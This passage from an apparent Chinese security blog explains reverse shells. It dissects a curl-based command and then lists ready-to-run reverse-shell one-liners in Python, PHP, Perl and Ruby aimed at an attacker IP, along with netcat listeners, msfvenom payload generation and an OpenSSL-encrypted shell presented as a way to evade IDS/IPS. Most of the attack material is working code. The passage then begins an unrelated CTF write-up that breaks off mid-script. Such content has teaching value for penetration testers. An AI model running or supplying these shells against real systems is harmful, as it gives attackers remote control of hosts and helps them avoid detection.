–silent：不显示进度或错误信息。但仍会传输指定数据或输出内容到 <code>stdout</code>。</li><li>-N, –no-buffer：禁用输出流的缓冲功能。正常情况下，curl 会使用一个标准的缓冲输出流，它的作用是将数据分块输出，而不是数据到达后立即输出。可使用该选项禁用这种缓冲。</li><li>-k, –insecure：忽略证书错误。</li><li>-T, –upload-file ：上传指定本地文件到远程 URL。可用 <code>-</code> 做文件名以从 <code>stdin</code> 读取文件内容；也可用 <code>.</code> 做文件名，以非阻塞模式从 <code>stdin</code> 读取文件内容。非阻塞模式是指可从 <code>stdin</code> 读取文件内容的同时读取服务端输出。</li></ul><h3 id="语法分析"><a href="#语法分析" class="headerlink" title="语法分析"></a>语法分析</h3><p>为理解魔法命令，我们先对其进行语法分析。</p><p>魔法命令被倒数第二个字符 <code>|</code> （管道）分为前后两部分，如下图所示。</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">                                                                       +-------+<br>                                                                       |<span class="hljs-string">       </span>|<br>                                                                       |<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<br>                                                                       |<span class="hljs-string">       </span>|<br>                                                                       +-+---+-+<br>                                                                         |<span class="hljs-string">   </span>|<br>+-----------------------------------------------------------------+      |<span class="hljs-string">   </span>|<span class="hljs-string">       +-------+</span><br><span class="hljs-string"></span>|<span class="hljs-string">                                                                 </span>|<span class="hljs-string">      </span>|<span class="hljs-string">   </span>|<span class="hljs-string">       </span>|<span class="hljs-string">       </span>|<br>|<span class="hljs-string"> &#123; curl -sNkT . https://$LHOST:$LPORT &lt;/dev/fd/3</span>|<span class="hljs-string"> sh 3&gt;&amp;-;&#125; 3&gt;&amp;1 +------+   +-------+   :   </span>|<br>|<span class="hljs-string">                                                                 </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">       </span>|<br>+-----------------------------------------------------------------+                  +-------+<br></code></pre></td></tr></table></figure><p>前半部分是写在花括号中的命令组，命令组中包含由管道连接的两条命令，如下图所示。</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">                                +-------+<br>                                |<span class="hljs-string">       </span>|<br>                                |<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<br>                                |<span class="hljs-string">       </span>|<br>                                +-+---+-+<br>                                  |<span class="hljs-string">   </span>|<br>              +------------+      |<span class="hljs-string">   </span>|<span class="hljs-string">       +-------+</span><br><span class="hljs-string">              </span>|<span class="hljs-string">            </span>|<span class="hljs-string">      </span>|<span class="hljs-string">   </span>|<span class="hljs-string">       </span>|<span class="hljs-string">       </span>|<br>              |<span class="hljs-string"> &#123;...&#125; 3&gt;&amp;1 +------+   +-------+   :   </span>|<br>              |<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">       </span>|<br>              +------+-----+                  +-------+<br>                     |<span class="hljs-string"></span><br><span class="hljs-string">              +------+-----+</span><br><span class="hljs-string">              </span>|<span class="hljs-string">            </span>|<br>              |<span class="hljs-string">      </span>|<span class="hljs-string">     </span>|<br>              |<span class="hljs-string">            </span>|<br>              +---+---+----+<br>                  |<span class="hljs-string">   </span>|<br>                  |<span class="hljs-string">   +-------------------------------------+</span><br><span class="hljs-string">                  </span>|<span class="hljs-string">                                         </span>|<br>+-----------------+------------------------------+    +-----+----+<br>|<span class="hljs-string">                                                </span>|<span class="hljs-string">    </span>|<span class="hljs-string">          </span>|<br>|<span class="hljs-string">  curl -sNkT . https://$LHOST:$LPORT &lt;/dev/fd/3 </span>|<span class="hljs-string">    </span>|<span class="hljs-string"> sh 3&gt;&amp;-; </span>|<br>|<span class="hljs-string">                                                </span>|<span class="hljs-string">    </span>|<span class="hljs-string">          </span>|<br>+------------------------------------------------+    +----------+<br></code></pre></td></tr></table></figure><h3 id="fd-重定向分析"><a href="#fd-重定向分析" class="headerlink" title="fd 重定向分析"></a>fd 重定向分析</h3><p>完成语法分析后可对 fd 重定向情况进行分析。</p><p>假设执行这条命令的 Bash 的 <code>stdin</code> 和 <code>stdout</code> 都是 <code>pts/0</code>。外层 <code>|</code>（倒数第二个字符）产生的匿名管道为 <code>pipe1</code>，内层 <code>|</code>（curl 和 sh 之间的管道）产生的匿名管道为 <code>pipe2</code>。</p><p>可标注出外层 <code>|</code> 前后命令的 fd 如下图所示。</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">                                                                       +-------+<br>                                                                       |<span class="hljs-string">       </span>|<br>                                                                       |<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<br>                                                                       |<span class="hljs-string">       </span>|<br>                                                                       +-+---+-+<br>                                                                         |<span class="hljs-string">   </span>|<br>+-----------------------------------------------------------------+      |<span class="hljs-string">   </span>|<span class="hljs-string">       +-------+</span><br><span class="hljs-string"></span>|<span class="hljs-string">                                                                 </span>|<span class="hljs-string">      </span>|<span class="hljs-string">   </span>|<span class="hljs-string">       </span>|<span class="hljs-string">       </span>|<br>|<span class="hljs-string"> &#123; curl -sNkT . https://$LHOST:$LPORT &lt;/dev/fd/3</span>|<span class="hljs-string"> sh 3&gt;&amp;-;&#125; 3&gt;&amp;1 +------+   +-------+   :   </span>|<br>|<span class="hljs-string">                                                                 </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">       </span>|<br>+-----------------------------------------------------------------+                  +-------+<br><br>                         stdin : pts/0                                              stdin : pipe1<br>                         stdout: pipe1                                              stdout: pts/0<br></code></pre></td></tr></table></figure><p>命令组后的 <code>3&gt;&amp;1</code> 将 fd 3 重定向到了 fd 1，即 <code>stdout</code>，如下图所示。</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">                                                                  +-------+<br>                                                                  |<span class="hljs-string">       </span>|<br>                                                                  |<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<br>                                                                  |<span class="hljs-string">       </span>|<br>                                                                  +-+---+-+<br>                                                                    |<span class="hljs-string">   </span>|<br>+------------------------------------------------------------+      |<span class="hljs-string">   </span>|<span class="hljs-string">       +-------+</span><br><span class="hljs-string"></span>|<span class="hljs-string">                                                            </span>|<span class="hljs-string">      </span>|<span class="hljs-string">   </span>|<span class="hljs-string">       </span>|<span class="hljs-string">       </span>|<br>|<span class="hljs-string"> &#123; curl -sNkT . https://$LHOST:$LPORT &lt;/dev/fd/3</span>|<span class="hljs-string"> sh 3&gt;&amp;-;&#125; +------+   +-------+   :   </span>|<br>|<span class="hljs-string">                                                            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">       </span>|<br>+------------------------------------------------------------+                  +-------+<br><br>                         stdin : pts/0                                         stdin : pipe1<br>                         stdout: pipe1                                         stdout: pts/0<br>                         fd 3  : pipe1<br></code></pre></td></tr></table></figure><p>命令组中的命令会继承 <code>&#123;&#125;</code> 的 fd，同时命令组中两条命令也由一个管道连接，综合这两点可标注出 curl 和 sh 的 fd 如下图所示。</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">                                 +-------+<br>                                 |<span class="hljs-string">       </span>|<br>                                 |<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<br>                                 |<span class="hljs-string">       </span>|<br>                                 +-+---+-+<br>                                   |<span class="hljs-string">   </span>|<br>               +------------+      |<span class="hljs-string">   </span>|<span class="hljs-string">       +-------+</span><br><span class="hljs-string">stdin : pts/0  </span>|<span class="hljs-string">            </span>|<span class="hljs-string">      </span>|<span class="hljs-string">   </span>|<span class="hljs-string">       </span>|<span class="hljs-string">       </span>|<br>stdout: pipe1  |<span class="hljs-string"> &#123;...&#125; 3&gt;&amp;1 +------+   +-------+   :   </span>|<br>fd 3  : pipe1  |<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">       </span>|<br>               +------+-----+                  +-------+<br>                      |<span class="hljs-string"></span><br><span class="hljs-string">               +------+-----+                 stdin : pipe1</span><br><span class="hljs-string">               </span>|<span class="hljs-string">            </span>|<span class="hljs-string">                 stdout: pts/0</span><br><span class="hljs-string">               </span>|<span class="hljs-string">      </span>|<span class="hljs-string">     </span>|<br>               |<span class="hljs-string">            </span>|<br>               +---+---+----+<br>                   |<span class="hljs-string">   </span>|<br>                   |<span class="hljs-string">   +-------------------------------------+</span><br><span class="hljs-string">                   </span>|<span class="hljs-string">                                         </span>|<br> +-----------------+------------------------------+    +-----+----+<br> |<span class="hljs-string">                                                </span>|<span class="hljs-string">    </span>|<span class="hljs-string">          </span>|<br> |<span class="hljs-string">  curl -sNkT . https://$LHOST:$LPORT &lt;/dev/fd/3 </span>|<span class="hljs-string">    </span>|<span class="hljs-string"> sh 3&gt;&amp;-; </span>|<br> |<span class="hljs-string">                                                </span>|<span class="hljs-string">    </span>|<span class="hljs-string">          </span>|<br> +------------------------------------------------+    +----------+<br><br>                 stdin : pts/0                         stdin : pipe2<br>                 stdout: pipe2                         stdout: pipe1<br>                 fd 3  : pipe1                         fd 3  : pipe1<br></code></pre></td></tr></table></figure><p>curl 和 sh 各自又有一个重定向。curl 的 <code>&lt;/dev/fd/3</code> 表示把 <code>stdin</code> 重定向为 fd 3，即 <code>pipe1</code>。sh 的 <code>3&gt;&amp;-</code> 表示关闭 fd 3。考虑到这两个重定向，最后可得到下图。</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">                                 +-------+<br>                                 |<span class="hljs-string">       </span>|<br>                                 |<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<br>                                 |<span class="hljs-string">       </span>|<br>                                 +-+---+-+<br>                                   |<span class="hljs-string">   </span>|<br>               +------------+      |<span class="hljs-string">   </span>|<span class="hljs-string">       +-------+</span><br><span class="hljs-string">stdin : pts/0  </span>|<span class="hljs-string">            </span>|<span class="hljs-string">      </span>|<span class="hljs-string">   </span>|<span class="hljs-string">       </span>|<span class="hljs-string">       </span>|<br>stdout: pipe1  |<span class="hljs-string"> &#123;...&#125; 3&gt;&amp;1 +------+   +-------+   :   </span>|<br>fd 3  : pipe1  |<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">       </span>|<br>               +------+-----+                  +-------+<br>                      |<span class="hljs-string"></span><br><span class="hljs-string">               +------+-----+                 stdin : pipe1</span><br><span class="hljs-string">               </span>|<span class="hljs-string">            </span>|<span class="hljs-string">                 stdout: pts/0</span><br><span class="hljs-string">               </span>|<span class="hljs-string">      </span>|<span class="hljs-string">     </span>|<br>               |<span class="hljs-string">            </span>|<br>               +---+---+----+<br>                   |<span class="hljs-string">   </span>|<br>                   |<span class="hljs-string">   +-------------------------------------+</span><br><span class="hljs-string">                   </span>|<span class="hljs-string">                                         </span>|<br> +-----------------+--------------------+              +-----+----+<br> |<span class="hljs-string">                                      </span>|<span class="hljs-string">              </span>|<span class="hljs-string">          </span>|<br> |<span class="hljs-string">  curl -sNkT . https://$LHOST:$LPORT  </span>|<span class="hljs-string">              </span>|<span class="hljs-string">    sh    </span>|<br> |<span class="hljs-string">                                      </span>|<span class="hljs-string">              </span>|<span class="hljs-string">          </span>|<br> +--------------------------------------+              +----------+<br><br>                stdin : pipe1                          stdin : pipe2<br>                stdout: pipe2                          stdout: pipe1<br>                fd 3  : pipe1<br></code></pre></td></tr></table></figure><p>从上图可以很清晰地看出，curl 的 <code>stdin</code> 和 sh 的 <code>stdout</code>、 sh 的 <code>stdin</code> 和 curl 的 <code>stdout</code> 分别通过匿名管道 <code>pipe1</code> 和 <code>pipe2</code> 相连。</p><h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p>至此，我们已经基本弄清了魔法命令的工作原理，总结如下：利用 Bash 语法：命令组、管道和重定向等让 curl 命令和 sh 命令的 <code>stdin</code> 和 <code>stdout</code> 交错相连；又添加 <code>-T</code> 等参数和文件名 <code>.</code> 让 curl 读取 <code>stdin</code> 的内容发送到服务端，同时读取服务端返回的数据并输出到 <code>stdout</code>。</p><h3 id="遗留问题"><a href="#遗留问题" class="headerlink" title="遗留问题"></a>遗留问题</h3><h4 id="为何要关闭-sh-命令的-fd-3？"><a href="#为何要关闭-sh-命令的-fd-3？" class="headerlink" title="为何要关闭 sh 命令的 fd 3？"></a>为何要关闭 sh 命令的 fd 3？</h4><p>测试发现其实不关闭 sh 命令的 fd 3 反弹 shell 也可以正常工作。</p><h4 id="命令的作用是什么？"><a href="#命令的作用是什么？" class="headerlink" title=": 命令的作用是什么？"></a>: 命令的作用是什么？</h4><p>建立匿名管道 <code>pipe1</code>，且 <code>:</code> 命令不会去读 <code>pipe1</code>，不影响反弹 shell 工作。如果把 <code>:</code> 换成同样不会读 <code>stdin</code> 的 <code>true</code> 命令，反弹 shell 仍然可以工作，但如果换成会读 <code>stdin</code> 的命令如 <code>cat</code>，反弹 shell 就无法工作了。</p><h2 id="各种脚本反弹shell"><a href="#各种脚本反弹shell" class="headerlink" title="各种脚本反弹shell"></a>各种脚本反弹shell</h2><h3 id="Python-脚本反弹shell"><a href="#Python-脚本反弹shell" class="headerlink" title="Python 脚本反弹shell"></a>Python 脚本反弹shell</h3><p>当目标主机上有python环境时，我们可以用Python来反弹shell。Python在现在一般发行版Linux系统中都会自带，所以使用起来也较为方便，即使没有安装，我们手动安装也很方便。</p><p><strong>攻击机开启本地监听：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">2333</span><br></code></pre></td></tr></table></figure><p><strong>目标机主动连接攻击机：</strong></p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">python -c &#x27;import <span class="hljs-keyword">socket</span>,subprocess,os;s=<span class="hljs-keyword">socket</span>.<span class="hljs-keyword">socket</span>(<span class="hljs-keyword">socket</span>.AF_INET,<span class="hljs-keyword">socket</span>.SOCK_STREAM);s.connect((<span class="hljs-string">&quot;47.xxx.xxx.72&quot;</span>,<span class="hljs-number">2333</span>));os.dup2(s.fileno(),<span class="hljs-number">0</span>); os.dup2(s.fileno(),<span class="hljs-number">1</span>); os.dup2(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);&#x27;<br></code></pre></td></tr></table></figure><h3 id="php-脚本反弹shell"><a href="#php-脚本反弹shell" class="headerlink" title="php 脚本反弹shell"></a>php 脚本反弹shell</h3><p>当目标主机上有php环境时，我们可以用php来反弹shell。</p><p><strong>攻击机开启本地监听：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">2333</span><br></code></pre></td></tr></table></figure><p><strong>目标机主动连接攻击机：</strong></p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">php -r &#x27;<span class="hljs-variable">$sock</span>=fsockopen(<span class="hljs-string">&quot;47.xxx.xxx.72&quot;</span>,<span class="hljs-number">2333</span>);<span class="hljs-keyword">exec</span>(<span class="hljs-string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);&#x27;<br></code></pre></td></tr></table></figure><h3 id="Perl-脚本反弹shell"><a href="#Perl-脚本反弹shell" class="headerlink" title="Perl 脚本反弹shell"></a>Perl 脚本反弹shell</h3><p>当目标主机上有perl环境时，我们可以用perl来反弹shell。</p><p><strong>攻击机开启本地监听：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">2333</span><br></code></pre></td></tr></table></figure><p><strong>目标机主动连接攻击机：</strong></p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">perl -e &#x27;use Socket;<span class="hljs-variable">$i</span>=<span class="hljs-string">&quot;47.101.57.72&quot;</span>;<span class="hljs-variable">$p</span>=<span class="hljs-number">2333</span>;<span class="hljs-keyword">socket</span>(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="hljs-string">&quot;tcp&quot;</span>));<span class="hljs-keyword">if</span>(connect(S,sockaddr_in(<span class="hljs-variable">$p</span>,inet_aton(<span class="hljs-variable">$i</span>))))&#123;<span class="hljs-keyword">open</span>(STDIN,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">open</span>(STDOUT,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">open</span>(STDERR,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">exec</span>(<span class="hljs-string">&quot;/bin/sh -i&quot;</span>);&#125;;&#x27;<br></code></pre></td></tr></table></figure><h3 id="Ruby脚本反弹shell"><a href="#Ruby脚本反弹shell" class="headerlink" title="Ruby脚本反弹shell"></a>Ruby脚本反弹shell</h3><p>当目标主机上有ruby环境时，我们可以用ruby来反弹shell。</p><p><strong>攻击机开启本地监听：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">2333</span><br></code></pre></td></tr></table></figure><p><strong>目标机主动连接攻击机：</strong></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">ruby -rsocket -e <span class="hljs-symbol">&#x27;c</span>=TCPSocket.<span class="hljs-keyword">new</span>(<span class="hljs-string">&quot;47.xxx.xxx.72&quot;</span>,<span class="hljs-string">&quot;2333&quot;</span>);<span class="hljs-keyword">while</span>(cmd=c.gets);IO.popen(cmd,<span class="hljs-string">&quot;r&quot;</span>)&#123;|io|c.print io.read&#125;<span class="hljs-keyword">end</span>&#x27;<br>或<br>ruby -rsocket -e <span class="hljs-symbol">&#x27;exit</span> <span class="hljs-keyword">if</span> fork;c=TCPSocket.<span class="hljs-keyword">new</span>(<span class="hljs-string">&quot;47.xxx.xxx.72&quot;</span>,<span class="hljs-string">&quot;2333&quot;</span>);<span class="hljs-keyword">while</span>(cmd=c.gets);IO.popen(cmd,<span class="hljs-string">&quot;r&quot;</span>)&#123;|io|c.print io.read&#125;<span class="hljs-keyword">end</span>&#x27;<br></code></pre></td></tr></table></figure><h2 id="使用Metasploit生成反弹shell用的一句话"><a href="#使用Metasploit生成反弹shell用的一句话" class="headerlink" title="使用Metasploit生成反弹shell用的一句话"></a>使用Metasploit生成反弹shell用的一句话</h2><p>强大的Metasploit框架也为我们提供了生成一句话反弹shell的工具，即msfvenom，绝对的实用。当我们不记得前面说的所有反弹shell的反弹语句时，只要我们有Metasploit，那么我们随时都可以使用 <code>msfvenom -l</code> 来查询生成我们所需要的各类命令行一句话，具体使用方法如下。</p><p>我们直接可以使用 <code>msfvenom -l</code> 结合关键字过滤（如cmd&#x2F;unix&#x2F;reverse），列出我们需要生成的各类反弹shell一句话的payload：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">msfvenom -l payloads | grep <span class="hljs-symbol">&#x27;cmd</span>/unix/<span class="hljs-keyword">reverse</span>&#x27;<br></code></pre></td></tr></table></figure><p>比如，我们获取一个python反弹shell的一句话：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p cmd/unix/reverse_python <span class="hljs-attribute">LHOST</span>=47.xxx.xxx.72 <span class="hljs-attribute">LPORT</span>=2333 -f raw<br></code></pre></td></tr></table></figure><p>将生成的python反弹shell的一句话在目标主机上执行即可</p><h2 id="反弹shell后获取模拟终端"><a href="#反弹shell后获取模拟终端" class="headerlink" title="反弹shell后获取模拟终端"></a>反弹shell后获取模拟终端</h2><p>其实，上面所讲的各种方法获取的shell都不是一个标准的虚拟终端环境，它仅仅是一个标准输入。你会发现存在一个问题，就是即使我们获取了目标虚拟终端控制权限，但是往往会发现其交互性非常的差，回显信息与可交互性非常的差和不稳定，具体见情况有以下几个种。</p><ul><li>获取的虚拟终端没有交互性，我们想给添加的账号设置密码或执行sudo等命令，无法完成。</li><li>标准的错误输出无法显示，无法正常使用vim等文本编辑器等。</li><li>获取的目标主机的虚拟终端使用非常不稳定，很容易断开连接。</li></ul><p>这往往都是因为我们获取的shell并不是标准的虚拟终端，为了能够完成输入密码等操作，我们必须模拟一个真正的终端设备。</p><p>我们其实可以借助于python默认包含的一个pty标准库来获取一个标准的虚拟终端环境。Python在现在一般发行版Linux系统中都会自带，所以使用起来也较为方便，即使没有安装，我们手动安装也很方便。</p><p>我们只需在获取的shell里面输入如下命令，即可模拟一个终端设备：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">python -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><h2 id="使用OpenSSL反弹加密shell"><a href="#使用OpenSSL反弹加密shell" class="headerlink" title="使用OpenSSL反弹加密shell"></a>使用OpenSSL反弹加密shell</h2><p>在上文中，我们总结了很多反弹shell得方法，但是我发现这种反弹 shell 方式都有一个缺点，那就是<strong>所有的流量都是明文传输的</strong>。这些通过shell通过传输的流量都可以被管理员直接抓取并理解，当目标主机网络环境存在网络防御检测系统时（IDS、IPS等），网络防御检测系统会获取到我们的通信内容并进行告警和阻止。因此，我们需要对通信的内容进行混淆或加密，这时可以选择使用 OpenSSL 反弹一个加密的 shell。</p><h3 id="OpenSSL-简介"><a href="#OpenSSL-简介" class="headerlink" title="OpenSSL 简介"></a>OpenSSL 简介</h3><p>在计算机网络上，OpenSSL 是一个开放源代码的软件库包，应用程序可以使用这个包来进行安全通信，避免窃听，同时确认另一端连接者的身份。</p><blockquote><p>SSL协议要求建立在可靠的传输层协议(TCP)之上。SSL协议的优势在于它是与应用层协议独立无关的，高层的应用层协议(例如：HTTP，FTP，TELNET等)能透明地建立于SSL协议之上。SSL协议在应用层协议通信之前就已经完成加密算法、通信密钥的协商及服务器认证工作。在此之后应用层协议所传送的数据都会被加密，从而保证通信的私密性。</p></blockquote><p>在利用 OpenSSL 反弹 shell 之前需要先生成自签名证书：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">openssl</span> req -x509 -newkey rsa:<span class="hljs-number">2048</span> -keyout key.pem -out cert.pem -days <span class="hljs-number">365</span> -nodes<br></code></pre></td></tr></table></figure><p>生成自签名证书时会提示输入证书信息，如果懒得填写可以一路回车即可</p><h3 id="使用OpenSSL反弹加密shell-1"><a href="#使用OpenSSL反弹加密shell-1" class="headerlink" title="使用OpenSSL反弹加密shell"></a>使用OpenSSL反弹加密shell</h3><p>实验环境：Linux</p><p>目标机：</p><ul><li>系统：Linux</li><li>IP：192.168.1.8</li></ul><p>攻击机：</p><ul><li>系统：Linux</li><li>IP：47.xxx.xxx.72</li></ul><p>假设我们从目标机反弹 shell 到攻击机 。首先需要利用上一步生成的自签名证书，在攻击机上使用 OpenSSL 监听一个端口，在这里使用 2333 端口：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">openssl s_server -quiet -<span class="hljs-type">key</span> <span class="hljs-type">key</span>.pem -cert cert.pem -port <span class="hljs-number">2333</span><br></code></pre></td></tr></table></figure><p>此时 OpenSSL 便在攻击机的 2333 端口上启动了一个 SSL&#x2F;TLS server。</p><p>这时在目标机进行反弹 shell 操作，命令为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkfifo</span> /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 47.xxx.xxx.72:2333 &gt; /tmp/s; <span class="hljs-built_in">rm</span> /tmp/s<br></code></pre></td></tr></table></figure><p>这样攻击者便使用 OpenSSL 反弹了目标机一个加密的 shell。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DASCTF X CBCTF 2023｜无畏者先行</title>
    <link href="/2023/10/23/DASCTF_X_CBCTF2023__%E6%97%A0%E7%95%8F%E8%80%85%E5%85%88%E8%A1%8C/"/>
    <url>/2023/10/23/DASCTF_X_CBCTF2023__%E6%97%A0%E7%95%8F%E8%80%85%E5%85%88%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Justpainting"><a href="#Justpainting" class="headerlink" title="Justpainting"></a>Justpainting</h2><p>010打开压缩包，发现结尾多了五个？，猜测加密压缩包的密码是五位</p><p>爆破得到密码11452</p><p>打开得到一个python脚本和一张jbn.pth</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> 